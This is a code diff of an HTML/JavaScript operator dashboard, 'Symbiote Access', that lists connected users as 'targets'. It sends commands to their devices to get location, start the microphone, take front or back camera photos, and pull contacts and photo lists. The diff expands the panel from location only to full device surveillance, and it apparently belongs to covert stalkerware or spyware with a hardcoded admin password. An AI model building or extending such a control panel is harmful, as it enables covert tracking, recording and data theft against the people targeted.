@@ -9,27 +9,20 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     
     <style>
-        /* CSS का हिस्सा - नया और एडवांस डिज़ाइन */
+        /* CSS का हिस्सा - एडवांस और शानदार डिज़ाइन */
         :root {
-            --bg-dark: #1f2937;
-            --bg-light: #374151;
-            --primary-color: #3b82f6;
-            --primary-hover: #2563eb;
-            --text-light: #f9fafb;
-            --text-secondary: #d1d5db;
-            --border-color: #4b5563;
-            --success-color: #22c55e;
-            --error-color: #ef4444;
+            --bg-darker: #111827; --bg-dark: #1f2937; --bg-light: #374151;
+            --primary-color: #3b82f6; --primary-hover: #2563eb;
+            --text-light: #f9fafb; --text-secondary: #d1d5db; --border-color: #4b5563;
+            --success-color: #22c55e; --error-color: #ef4444;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-dark);
-            color: var(--text-light);
-            font-size: 16px;
-            overscroll-behavior: none;
+            background-color: var(--bg-darker); color: var(--text-light); font-size: 16px;
+            overflow: hidden; /* पेज को स्क्रॉल होने से रोकता है */
         }
 
         /* --- लॉगिन स्क्रीन --- */
@@ -45,36 +38,25 @@
             border: 1px solid var(--border-color); animation: fadeIn 0.5s ease;
         }
         .login-box h2 { margin-bottom: 20px; }
-        .login-box input {
-            width: 100%; padding: 12px; margin-bottom: 20px; background-color: var(--bg-dark);
-            border: 1px solid var(--border-color); border-radius: 5px; color: var(--text-light); font-size: 1em;
-        }
-        .login-box button {
-            width: 100%; padding: 12px; background-color: var(--primary-color); border: none;
-            border-radius: 5px; color: white; font-size: 1.1em; font-weight: bold;
-            cursor: pointer; transition: background-color 0.2s;
-        }
+        .login-box input { width: 100%; padding: 12px; margin-bottom: 20px; background-color: var(--bg-dark); border: 1px solid var(--border-color); border-radius: 5px; color: var(--text-light); font-size: 1em; }
+        .login-box button { width: 100%; padding: 12px; background-color: var(--primary-color); border: none; border-radius: 5px; color: white; font-size: 1.1em; font-weight: bold; cursor: pointer; transition: background-color 0.2s; }
         .login-box button:hover { background-color: var(--primary-hover); }
         #login-error { color: var(--error-color); margin-top: 15px; display: none; }
 
         /* --- मुख्य डैशबोर्ड लेआउट --- */
         .hidden { display: none !important; }
-        .dashboard-grid { display: grid; grid-template-columns: 320px 1fr; height: 100vh; }
-        .sidebar { background-color: var(--bg-light); padding: 20px; border-right: 1px solid var(--border-color); display: flex; flex-direction: column; }
-        .main-content { display: grid; grid-template-rows: auto 1fr; padding: 20px; gap: 20px; overflow-y: auto; }
+        .dashboard-grid { display: grid; grid-template-columns: 350px 1fr; height: 100vh; }
+        .sidebar { background-color: var(--bg-dark); padding: 20px; border-right: 1px solid var(--border-color); display: flex; flex-direction: column; }
+        .main-content { padding: 20px; gap: 20px; overflow-y: auto; }
         .header { text-align: center; padding-bottom: 15px; border-bottom: 1px solid var(--border-color); margin-bottom: 15px; }
         .header h1 { font-size: 1.5em; }
-        .card { background-color: var(--bg-light); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color); }
+        .card { background-color: var(--bg-light); padding: 20px; border-radius: 8px; margin-bottom: 20px; }
         .card h3 { margin-bottom: 15px; color: var(--text-secondary); font-size: 1.1em; display: flex; align-items: center; }
         .card h3 i { margin-right: 10px; }
 
         /* --- यूज़र लिस्ट --- */
-        #user-list { flex-grow: 1; overflow-y: auto; }
-        .user-item {
-            display: flex; align-items: center; padding: 15px;
-            border-radius: 6px; cursor: pointer; transition: background-color 0.2s;
-            border: 1px solid transparent;
-        }
+        #user-list-container { flex-grow: 1; overflow-y: auto; }
+        .user-item { display: flex; align-items: center; padding: 15px; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; border: 1px solid transparent; }
         .user-item:hover { background-color: var(--border-color); }
         .user-item.selected { background-color: var(--primary-color); border-color: var(--primary-hover); }
         .user-item img { width: 40px; height: 40px; border-radius: 50%; margin-right: 15px; }
@@ -82,38 +64,29 @@
         .user-info .email { font-size: 0.8em; color: var(--text-secondary); }
 
         /* --- कमांड्स और लॉग्स --- */
-        .command-btn {
-            width: 100%; padding: 15px; font-size: 1em; background-color: var(--primary-color);
-            color: white; border: none; border-radius: 5px; cursor: pointer;
-            text-align: left; transition: all 0.2s; display: flex; align-items: center;
-        }
+        .command-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .command-btn { width: 100%; padding: 12px; font-size: 1em; background-color: var(--primary-color); color: white; border: none; border-radius: 5px; cursor: pointer; text-align: left; transition: all 0.2s; display: flex; align-items: center; }
         .command-btn:hover { background-color: var(--primary-hover); }
-        .command-btn:disabled { background-color: var(--border-color); cursor: not-allowed; }
-        #status-log { height: 200px; overflow-y: auto; font-size: 0.9em; color: var(--text-secondary); }
-        #status-log div { padding: 5px 0; border-bottom: 1px solid var(--border-color); }
+        .command-btn:disabled { background-color: var(--border-color); cursor: not-allowed; opacity: 0.6; }
+        .command-btn i { margin-right: 10px; width: 20px; text-align: center; }
 
         /* --- लाइव डेटा फीड --- */
-        #data-display { display: flex; flex-direction: column; gap: 15px; }
-        .data-item {
-            background-color: var(--bg-light); border: 1px solid var(--border-color); border-radius: 8px;
-            padding: 15px; animation: fadeIn 0.5s ease;
-        }
+        #data-display { display: flex; flex-direction: column; gap: 15px; height: calc(100vh - 100px); overflow-y: auto; padding: 10px; background-color: var(--bg-dark); border-radius: 8px;}
+        .data-item { background-color: var(--bg-light); border: 1px solid var(--border-color); border-radius: 8px; padding: 15px; animation: fadeIn 0.5s ease; }
         .data-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; color: var(--text-secondary); }
         .data-header .type { font-weight: bold; color: var(--text-light); font-size: 1.1em; display: flex; align-items: center;}
-        .data-body { font-family: 'Courier New', Courier, monospace; word-wrap: break-word; background-color: var(--bg-dark); padding: 10px; border-radius: 5px; }
-        .data-item.error .data-header .type { color: var(--error-color); }
+        .data-body { font-family: 'Courier New', Courier, monospace; word-wrap: break-word; background-color: var(--bg-dark); padding: 10px; border-radius: 5px; max-height: 300px; overflow-y: auto;}
         
+        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; }
+        .photo-grid img { width: 100%; height: 100px; object-fit: cover; border-radius: 5px; }
+        .contact-list { list-style: none; padding: 0; }
+        .contact-list li { padding: 5px; border-bottom: 1px solid var(--border-color); }
+
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        /* मोबाइल के लिए रेस्पॉन्सिव डिज़ाइन */
-        @media (max-width: 768px) {
-            .dashboard-grid { grid-template-columns: 1fr; }
-            .sidebar { height: 40vh; border-right: none; border-bottom: 1px solid var(--border-color); }
-        }
     </style>
 </head>
 <body>
 
-    <!-- लॉगिन स्क्रीन -->
     <div id="login-container">
         <div class="login-box">
             <h2><i class="fa-solid fa-shield-virus"></i> Symbiote Access</h2>
@@ -123,41 +96,37 @@
         </div>
     </div>
 
-    <!-- मुख्य डैशबोर्ड -->
     <main id="dashboard" class="dashboard-grid hidden">
         
-        <!-- बायां पैनल: यूज़र्स की लिस्ट -->
         <aside class="sidebar">
-            <header>
-                <h1><i class="fa-solid fa-users"></i> Connected Users</h1>
-            </header>
-            <div id="user-list">
-                <!-- यूज़र यहाँ जावास्क्रिप्ट से लोड होंगे -->
-            </div>
+            <header><h1><i class="fa-solid fa-users"></i> Connected Users</h1></header>
+            <div id="user-list-container"><p id="user-loader" style="text-align: center; padding: 20px;">Loading targets...</p></div>
         </aside>
         
-        <!-- दायां पैनल: कमांड्स और लाइव डेटा -->
         <div class="main-content">
             <div class="card">
                 <h3><i class="fa-solid fa-bullseye"></i> Target & Commands</h3>
-                <div id="selected-user-details" style="margin-bottom: 15px;">No target selected.</div>
-                <button id="getLocationBtn" class="command-btn" disabled><i class="fa-solid fa-location-crosshairs" style="margin-right: 10px;"></i> Execute: Get Location</button>
-            </div>
-            
-            <div class="card" style="display: flex; flex-direction: column;">
-                <h3><i class="fa-solid fa-satellite-dish"></i> Live Data Feed</h3>
-                <div id="data-display" style="flex-grow: 1; overflow-y: auto;">
-                     <!-- डेटा यहाँ जावास्क्रिप्ट से लोड होगा -->
+                <div id="selected-user-details" style="margin-bottom: 15px;">Please select a target from the list.</div>
+                <div class="command-grid">
+                    <!-- डिवाइस कमांड्स -->
+                    <button id="getLocationBtn" class="command-btn" disabled><i class="fa-solid fa-location-crosshairs"></i>Get Location</button>
+                    <button id="startMicBtn" class="command-btn" disabled><i class="fa-solid fa-microphone"></i>Start Microphone</button>
+                    <button id="takePhotoFrontBtn" class="command-btn" disabled><i class="fa-solid fa-camera-rotate"></i>Take Photo (Front)</button>
+                    <button id="takePhotoBackBtn" class="command-btn" disabled><i class="fa-solid fa-camera"></i>Take Photo (Back)</button>
+                    <!-- गूगल डेटा कमांड्स -->
+                    <button id="getContactsBtn" class="command-btn" disabled><i class="fa-solid fa-address-book"></i>Get Contacts</button>
+                    <button id="getPhotosBtn" class="command-btn" disabled><i class="fa-solid fa-images"></i>List Photos</button>
                 </div>
             </div>
+            
+            <div id="data-display-container" style="height: 100%; display: flex; flex-direction: column;">
+                <h3><i class="fa-solid fa-satellite-dish"></i> Live Data Feed</h3>
+                <div id="data-display"> <!-- डेटा यहाँ जावास्क्रिप्ट से लोड होगा --> </div>
+            </div>
         </div>
-        
     </main>
 
-
     <script>
-        // एडमिन पैनल का जावास्क्रिप्ट - अब यह Firestore से बात करेगा
-        
         const ADMIN_PASSWORD = "himanshu@123";
 
         // DOM Elements
@@ -166,26 +135,24 @@
         const loginButton = document.getElementById('login-button');
         const loginError = document.getElementById('login-error');
         const dashboard = document.getElementById('dashboard');
-        const userListDiv = document.getElementById('user-list');
-        const getLocationBtn = document.getElementById('getLocationBtn');
+        const userListDiv = document.getElementById('user-list-container');
+        const userLoader = document.getElementById('user-loader');
         const dataDisplay = document.getElementById('data-display');
         const selectedUserDetailsDiv = document.getElementById('selected-user-details');
+        const commandButtons = document.querySelectorAll('.command-btn');
 
         // App State
         let selectedUserId = null;
-        let displayedDataCount = 0;
 
         // --- लॉगिन ---
         loginButton.addEventListener('click', handleLogin);
-        passwordInput.addEventListener('keyup', (event) => {
-            if (event.key === 'Enter') handleLogin();
-        });
+        passwordInput.addEventListener('keyup', (event) => { if (event.key === 'Enter') handleLogin(); });
+
         function handleLogin() {
             if (passwordInput.value === ADMIN_PASSWORD) {
                 loginContainer.classList.add('hidden');
                 dashboard.classList.remove('hidden');
                 fetchUsers();
-                startFetchingData();
             } else {
                 loginError.style.display = 'block';
             }
@@ -196,106 +163,67 @@
             try {
                 const response = await fetch('/get-users');
                 const users = await response.json();
-                userListDiv.innerHTML = ''; // पुरानी लिस्ट को साफ़ करें
+                userLoader.classList.add('hidden');
+                userListDiv.innerHTML = '';
                 users.forEach(user => {
                     const userDiv = document.createElement('div');
                     userDiv.className = 'user-item';
                     userDiv.dataset.userId = user.uid;
-                    userDiv.innerHTML = `
-                        <img src="${user.photoURL}" alt="DP">
-                        <div class="user-info">
-                            <div class="name">${user.displayName}</div>
-                            <div class="email">${user.email}</div>
-                        </div>
-                    `;
+                    userDiv.innerHTML = `<img src="${user.photoURL}" alt="DP"><div class="user-info"><div class="name">${user.displayName}</div><div class="email">${user.email}</div></div>`;
                     userDiv.addEventListener('click', () => selectUser(user));
                     userListDiv.appendChild(userDiv);
                 });
             } catch (error) {
-                console.error('Failed to fetch users:', error);
+                userLoader.textContent = "Failed to load targets.";
             }
         }
         
         function selectUser(user) {
             selectedUserId = user.uid;
-            
-            // पुराने सलेक्शन को हटाएं
             document.querySelectorAll('.user-item').forEach(item => item.classList.remove('selected'));
-            // नए को हाईलाइट करें
             document.querySelector(`[data-user-id="${user.uid}"]`).classList.add('selected');
-            
             selectedUserDetailsDiv.innerHTML = `<b>Selected Target:</b> ${user.displayName}`;
-            getLocationBtn.disabled = false; // अब कमांड बटन को इनेबल करें
+            commandButtons.forEach(btn => btn.disabled = false);
         }
 
         async function sendCommand(commandObject) {
-            if (!selectedUserId) {
-                alert('Please select a user first!');
-                return;
-            }
-            getLocationBtn.disabled = true; // दोबारा क्लिक होने से रोकें
+            if (!selectedUserId) { alert('Please select a user first!'); return; }
+            displayLog('info', `Sending command: ${commandObject.command}...`);
             try {
-                await fetch('/send-command', {
+                const response = await fetch('/send-command', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        userId: selectedUserId,
-                        command: commandObject
-                    })
+                    body: JSON.stringify({ userId: selectedUserId, command: commandObject })
                 });
+                if (!response.ok) displayLog('error', 'Server rejected the command.');
             } catch (error) {
-                console.error('Send command error:', error);
-            } finally {
-                getLocationBtn.disabled = false; // कमांड के बाद फिर से इनेबल करें
+                displayLog('error', 'Network error while sending command.');
             }
         }
 
-        function startFetchingData() {
-            setInterval(fetchData, 5000);
-            fetchData();
-        }
+        function displayLog(type, message) {
+            const itemCard = document.createElement('div');
+            itemCard.className = 'data-item';
+            let iconClass = 'fa-solid fa-info-circle';
+            if (type === 'error') iconClass = 'fa-solid fa-triangle-exclamation';
 
-        async function fetchData() {
-            try {
-                const response = await fetch('/get-reported-data');
-                const data = await response.json();
-                if (data.length > displayedDataCount) {
-                    const newData = data.slice(displayedDataCount);
-                    displayData(newData);
-                    displayedDataCount = data.length;
-                }
-            } catch (error) {
-                console.error('Fetch data error:', error);
-            }
-        }
-        
-        function displayData(newDataArray) {
-            newDataArray.forEach(item => {
-                const itemCard = document.createElement('div');
-                itemCard.className = `data-item ${item.type === 'error' ? 'error' : ''}`;
-                let iconClass = 'fa-solid fa-question';
-                if (item.type === 'location') iconClass = 'fa-solid fa-location-dot';
-                if (item.type === 'error') iconClass = 'fa-solid fa-triangle-exclamation';
-
-                let bodyContent = (item.type === 'location')
-                    ? `Latitude: ${item.latitude}<br>Longitude: ${item.longitude}<br>Accuracy: ${item.accuracy}m`
-                    : item.message || JSON.stringify(item, null, 2);
-
-                itemCard.innerHTML = `
-                    <div class="data-header">
-                        <span class="type"><i class="${iconClass}" style="margin-right: 10px;"></i> ${item.type.toUpperCase()}</span>
-                        <span class="timestamp"><i class="fa-regular fa-clock" style="margin-right: 5px;"></i> ${new Date(item.timestamp).toLocaleString()}</span>
-                    </div>
-                    <div class="data-body">${bodyContent}</div>
-                `;
-                dataDisplay.prepend(itemCard);
-            });
+            itemCard.innerHTML = `
+                <div class="data-header">
+                    <span class="type"><i class="${iconClass}" style="margin-right: 10px;"></i> LOG</span>
+                    <span class="timestamp"><i class="fa-regular fa-clock" style="margin-right: 5px;"></i> ${new Date().toLocaleString()}</span>
+                </div>
+                <div class="data-body">${message}</div>`;
+            dataDisplay.prepend(itemCard);
         }
 
         // --- इवेंट लिस्टनर्स ---
-        getLocationBtn.addEventListener('click', () => {
-            sendCommand({ command: 'get_location' });
-        });
+        document.getElementById('getLocationBtn').addEventListener('click', () => sendCommand({ command: 'get_location' }));
+        document.getElementById('startMicBtn').addEventListener('click', () => sendCommand({ command: 'start_mic' }));
+        document.getElementById('takePhotoFrontBtn').addEventListener('click', () => sendCommand({ command: 'take_photo', payload: { camera: 'front' } }));
+        document.getElementById('takePhotoBackBtn').addEventListener('click', () => sendCommand({ command: 'take_photo', payload: { camera: 'back' } }));
+        document.getElementById('getContactsBtn').addEventListener('click', () => sendCommand({ command: 'get_contacts' }));
+        document.getElementById('getPhotosBtn').addEventListener('click', () => sendCommand({ command: 'list_photos' }));
+
     </script>
 </body>
 </html>
